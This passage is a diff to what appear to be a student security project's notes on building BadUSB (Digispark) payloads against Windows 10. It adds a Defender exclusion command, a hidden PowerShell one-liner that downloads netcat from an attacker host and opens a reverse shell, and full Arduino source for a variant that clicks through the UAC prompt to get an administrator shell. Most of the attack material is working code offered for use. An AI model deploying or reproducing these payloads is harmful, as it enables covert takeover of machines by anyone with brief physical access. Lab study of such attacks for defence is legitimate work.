@@ -557,4 +557,125 @@ https://viperone.gitbook.io/pentest-everything/everything/everything-active-dire
 Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 ```
 
-*To be continued...*
+
+To check:
+```powershell
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+```
+
+**So far there has been no need to disable or circle around the Defender, so the previously mentioned methods will serve as notes. Coming back to this and continuing from here, when it becomes necessary, most likely later on.**
+
+### 12.10.2023
+*Improving the Reverse Shell payload*
+
+As the original demo we did, was quite slow and after the results of the [ransomware payload improvements](https://github.com/therealhalonen/PhishSticks/blob/04ffbcb30b5a5cad4d38c54e4ceb975d5b421ff8/notes/rajala/notes.md#11102023) I decided to give the Reverse Shell a little bit improvement too.
+
+Original:    
+https://github.com/therealhalonen/PhishSticks/blob/master/payloads/revshell_digispark/revshell_digispark.ino   
+
+To break it down:   
+- It first opens the "Run"
+- Types `powershell` end presses Enter
+	- In/From Powershell, it downloaded the nc64.exe, from attacker to victim
+	- Exits
+- Opens "Run" again.
+	- Types `cmd` and presses Enter
+		- Starts the nc64.exe minimized = Calls the attacker.
+Reverse Shell is opened, and the nc64.exe is/was showing in the quicklaunch bar or whatever it is in Windows, thing in the bottom.
+
+I got an idea, as "everything is possible" mindset running, that i want to do it with only:
+- Open "Run"
+	- Run a oneliner while keeping everything hidden.
+
+Sounds cool...
+
+Well at this point we had already, as mentioned in the beginning, the randomware payload tested and running hidden, i edited the revshell payload, and tested it manually:
+
+The oneliner:
+```bash
+powershell -w hidden -c "Invoke-WebRequest -OutFile $env:UserProfile/nc64.exe -Uri http://192.168.66.2/nc64.exe ; Start-Process \"$env:UserProfile/nc64.exe\" -ArgumentList '192.168.66.2', '9001', '-e', 'powershell' -NoNewWindow" 
+```
+
+Explanations:
+```bash
+-w hidden #Window mode hidden
+-c # a command, and in this case, 2 commands, one after another is successfull
+# Download the file to specific location
+# Run the file from specific location
+# No workdir needed here
+- NoNewWindow # Doesnt open up a separate cmd window for nc64.exe execution. 
+```
+
+The command is short enough to fit the Windows Run, as there are some length limitations, noticed in previous individual testings:
+
+![](notes_res/notes-%203.png)
+
+Ran superfast and got a reverse shell:
+
+![](notes_res/notes-%204.png)
+
+Payload:    
+[revshell_digispark_v2.ino](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/revshell_digispark_v2/revshell_digispark_v2.ino)   
+
+*Another thing, to make it maybe more simple, is to make it download the nc64.exe from the web, instead of serving it from the attacker machine, but thats at this point, only something to think about, and why.*   
+
+*That would be as easy as just changing the url to:*  
+*https://github.com/int0x33/nc.exe/raw/master/nc64.exe*
+
+*And possible shortening it with the help of some known services.*
+
+*Credits to:*   
+*https://github.com/int0x33*
+
+**But now as it works as it should, theres no need to tinker it anymore.**
+
+Another "topic" related and natural continuation here, as the whole project started as an *experimental thing*, is to take at least a quick look to privilege escalation.
+
+*What ive learned the most, from the beginning to this point, is mostly about Windows and Powershell, as i have quite a long history in daily Linux usage.*
+
+It seemed that the `-Verb -RunAs` will make the Powershell run with Admin privileges. Of course, as we are testing everything with Windows 10 and all security as default, it asks a confirmation.  These could be quite easily, not bypassed, but "accepted" with the help of Digispark.  
+**Problem comes, that it seems you cannot run `-Verb -RunAs` and `-NoNewWindow` together(?)**
+
+Dirty workaround, to get reverse shell with admin privileges:   
+[revshell_digispark_v2_5.ino](https://github.com/therealhalonen/PhishSticks/blob/master/payloads/revshell_digispark_v2_5/revshell_digispark_v2_5.ino)   
+```bash
+#include <DigiKeyboardFi.h>
+
+void setup() {}
+
+void loop() {
+
+// Description: BadUSB Reverse Shell v2.5
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboardFi.print("powershell -w hidden -c \"Invoke-WebRequest -OutFile $env:UserProfile/nc64.exe -Uri http://192.168.66.2/nc64.exe ; Start-Process -FilePath $env:UserProfile/nc64.exe -ArgumentList '192.168.66.2', '9001', '-e', 'powershell' -Verb RunAs");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(3000);
+DigiKeyboard.sendKeyStroke(43); // 43=TAB
+DigiKeyboard.sendKeyStroke(43); // 43=TAB
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+exit(0);
+}
+```
+
+Outcome:
+![](notes_res/notes-%205.png)
+
+Checking from attacker machine, if got Admin privileges for the session:
+![](notes_res/notes-%206.png)
+
+Explanation for checking command:   
+https://superuser.com/questions/749243/detect-if-powershell-is-running-as-administrator   
+With specific details:   
+https://superuser.com/a/749259
+
+Comparison to regular user session in Powershell:   
+
+![](notes_res/notes-%207.png)
+
+**BOOM!**
